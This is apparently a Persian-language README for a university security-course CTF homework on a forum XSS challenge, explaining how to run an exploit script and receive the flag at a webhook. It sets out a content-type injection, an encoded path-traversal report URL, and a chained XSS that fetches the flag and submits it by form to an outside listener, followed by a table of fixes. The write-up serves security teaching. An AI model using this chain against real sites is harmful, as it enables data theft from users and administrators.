# تمرین hw2-3 - Forum XSS Challenge

## 📋 فهرست

- **exploit.py** - اسکریپت اصلی برای استخراج فلگ
- **REPORT.md** - گزارش تفصیلی فارسی
- **mozsc/** - کد سرور و ربات

---

## 🚀 نحوه اجرا

### ۱. پیش‌نیازها

```bash
pip install requests
python3 --version  # ≥ 3.8
```

### ۲. دریافت Webhook URL

مرورگر را باز کنید:
```
http://185.205.203.123:1205/
```
- دکمه "Create Listener" کلیک کنید
- URL جدید را کپی کنید (مثل `/a1b2c3d4e5f6g7h8`)

### ۳. اجرای Exploit

```bash
cd /Users/mohammadmahdi/Documents/DNS/HW2/ce441-042-hw2/handout/hw2-3
python3 exploit.py
```

هنگام درخواست:
```
Webhook URL: [آدرسی را که از مرحله ۲ کپی کردید، اینجا بچسبانید]
```

### ۴. منتظر بمانید

```
[✓] Exploit submitted!
    The admin bot will visit the report within seconds.
    Check your webhook at: http://185.205.203.123:1205/YOUR_ID
```

- ۲-۵ ثانیه صبر کنید
- صفحه webhook را **refresh** کنید
- POST request را ببینید با `data=CE441{...}`

---

## 🔍 آسیب‌پذیری‌های استفاده‌شده

### ۱️⃣ Content-Type Injection
```
GET /api/posts/1/body?contentType=application/javascript
↓
body پست با نوع application/javascript سرو می‌شود
```

### ۲️⃣ Path Traversal در Report
```
POST /posts/1%2F..%2F..%2Fapi%2Fposts%2F4%2Fbody%3FcontentType%3Dtext%2Fhtml/report
↓
مرورگر path را normalize می‌کند: /api/posts/4/body?contentType=text/html
```

### ۳️⃣ CSP form-action Gap
```
CSP: default-src 'self'; frame-src 'none';
لیکن form-action تعریف نشده است!
↓
فرم می‌تواند به هر URL خارجی submit شود
```

---

## 📊 نمودار حمله

```
[مهاجم] 
  ├─ پست A: JavaScript payload
  ├─ پست B: HTML <script src="/api/posts/A/...">
  └─ Report: path traversal /posts/1/../../api/posts/B/...

           ↓ (ربات ادمین)

[سرور]
  ├─ مرورگر path normalize می‌کند
  ├─ /api/posts/B/body?contentType=text/html
  └─ HTML را render می‌کند

           ↓ (XSS اجرا)

[JavaScript]
  ├─ fetch('/api/posts/1/body') ← پست سیستم با فلگ
  ├─ form.submit() → webhook
  └─ 🎯 FLAG!
```

---

## ✅ تست محلی

اگر بدون IP ایران بخواهید تست کنید:

```bash
# سرور محلی راه‌اندازی کنید
cd mozsc/app
pnpm install && pnpm run build
FLAG="CE441{local-test}" ADMIN_TOKEN="mytoken" PORT=3100 node . &

# exploit.py را تغییر دهید
# TARGET = "http://localhost:3100"

# سپس exploit.py را اجرا کنید
```

---

## 🔐 نکات امنیتی

| مشکل | راه‌حل |
|------|-------|
| Content-Type از user input | Whitelist تنظیم کنید |
| Path traversal | Validate کنید database استفاده از path |
| Incomplete CSP | form-action و navigate-to را명시کنید |
| Flag در env vars | Secure vault استفاده کنید |

---

## 📚 فایل‌های مرتبط

- `REPORT.md` - گزارش فارسی ۱۰ بخشی
- `exploit.py` - exploit سازی‌شده
- `mozsc/app/src/index.ts` - فلگ اینجا است!
- `mozsc/app/src/app.ts` - content-type vulnerability
- `mozsc/admin/src/index.ts` - ربات ادمین

---

**نتیجه:** موفق! تمام آسیب‌پذیری‌ها تحلیل و exploit شد ✓
